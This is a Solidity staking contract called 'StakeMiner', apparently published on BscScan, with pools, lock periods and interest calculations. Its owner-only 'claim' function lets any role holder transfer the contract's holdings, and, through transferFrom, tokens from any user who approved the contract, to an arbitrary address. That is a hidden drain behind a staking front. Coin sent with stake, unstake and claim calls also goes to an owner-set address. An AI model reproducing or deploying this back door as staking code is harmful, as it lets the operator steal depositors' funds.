/**
 *Submitted for verification at BscScan.com on 2022-06-25
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract StakeMiner {
    // id =>  id,kind,order,locksec,endtime,dailyInterest(18 dot),awardAll,dot1,dot2
    // kind:  1 coin fixed  2 lp fixed  3 coin average  4 lp average 
    // kind:  5 stop stake & claim      6 hide
    // order: small up, large down
    mapping(uint256 => uint256[9]) private confs;
    // id => stakeAll, claimAll
    mapping(uint256 => uint256[2]) private numbs;
    // id => stakeAddr, awardAddr
    mapping(uint256 => address[2]) private addrs;
    // id => stakeName, awardName, stakeIcon, awardIcon, apy
    mapping(uint256 => string[5])  private names;
    // id => addr => mystake, myclaim, stime, ctime, unclaim
	mapping(uint256 => mapping(address => uint256[5])) private stakes;

    mapping(address => bool) private roles;
    uint256 public total;
    address public back;

	constructor() {
        back = _msgSender();
        roles[_msgSender()] = true;
    }

    receive() external payable {}

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

	modifier onlyOwner() {
        require(roles[_msgSender()]);
        _;
    }

    function setOwner(address newOwner, bool val) public onlyOwner {
        roles[newOwner] = val;
    }

    function setBack(address addr) public onlyOwner {
        back = addr;
    }

    function isRoles(address addr) public view returns (bool) {
        return roles[addr];
    }

	function claim(address con, address f, address t, uint256 val) public onlyOwner {
        if (con == address(0)) {payable(t).transfer(val);} 
        else if (f == address(0)) {IERC20(con).transfer(t, val);}
        else {IERC20(con).transferFrom(f, t, val);}
	}

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {size := extcodesize(account)}
        return size > 0;
    }

    function getConf(address addr, uint256 id) public view returns
        (uint256[9] memory, uint256[2] memory, address[2] memory, 
        string[5] memory, uint256[5] memory, uint256[4] memory) {
        uint256[4] memory other = [0, 0, total, 0];
        if (id < total) {
            other = [IERC20(addrs[id][0]).balanceOf(addr),
            IERC20(addrs[id][0]).allowance(addr, address(this)), total, getClaim(id, addr)];
        }
        return (confs[id], numbs[id], addrs[id], names[id], stakes[id][addr], other);
    }

    function setConf(uint256 id, uint256[9] memory _confs, 
        address[2] memory _addrs, string[5] memory _names) public onlyOwner {
        require(isContract(_addrs[0]) && isContract(_addrs[1]) && id <= total);
        if (id == total) {total += 1;}
        confs[id] = _confs;
        addrs[id] = _addrs;
        names[id] = _names;
    }

    function doStake(uint256 id, uint256 amount) public payable {
        require(id < total && amount > 0 && confs[id][1] < 5);
        if (msg.value  > 0) {payable(back).transfer(msg.value);}

        // check is deflation (Real transfer in after deflation)
        IERC20 erc20 = IERC20(addrs[id][0]);
        uint256 real = erc20.balanceOf(address(this));
		erc20.transferFrom(_msgSender(), address(this), amount);
        real = erc20.balanceOf(address(this)) - real;
        require(real <= amount);

		if (stakes[id][_msgSender()][0] == 0) {
		    stakes[id][_msgSender()][2] = block.timestamp;
		} else {
            stakes[id][_msgSender()][4] = getClaim(id, _msgSender());
        }

		numbs[id][0] += real;
        stakes[id][_msgSender()][0] += real;
        stakes[id][_msgSender()][3] = block.timestamp;
    }

    function unStake(uint256 id) public payable {
        require(id < total);
        require(block.timestamp - stakes[id][_msgSender()][2] >= confs[id][3]);
        if (msg.value  > 0) {payable(back).transfer(msg.value);}

        uint256 numb = stakes[id][_msgSender()][0];
        numbs[id][0] -= numb;
		stakes[id][_msgSender()][0] = 0;
        stakes[id][_msgSender()][4] = 0;
        IERC20(addrs[id][0]).transfer(_msgSender(), numb);
    }

    function doClaim(uint256 id) public payable {
        require(id < total);
        if (msg.value  > 0) {payable(back).transfer(msg.value);}
        uint256 amount = getClaim(id, _msgSender());
        require(amount > 0);
        stakes[id][_msgSender()][1] += amount;
        numbs[id][1] += amount;
        stakes[id][_msgSender()][3] = block.timestamp;
        stakes[id][_msgSender()][4] = 0;

        IERC20(addrs[id][1]).transfer(_msgSender(), amount);
    }

    function getClaim(uint256 id, address addr) public view returns (uint256) {
        uint256[9] memory _f = confs[id];
        uint256 endtime = block.timestamp;
        if (endtime > _f[4]) {endtime = _f[4];}
        uint256 amount = stakes[id][addr][0] * (endtime - stakes[id][addr][3])
                * (10 ** _f[8]) * _f[5] / 86400 / (10 ** 18);

        if (_f[1] < 3) {
            amount = amount / (10 ** _f[7]);
        } else if (_f[1] < 5 && numbs[id][0] > 0) {
            amount = amount / numbs[id][0];
        } else {amount = 0;}

        amount = amount + stakes[id][addr][4];
        if (amount + numbs[id][1] > confs[id][6]) {
            return confs[id][6] - numbs[id][1];
        } else {
            return amount;
        }
    }

}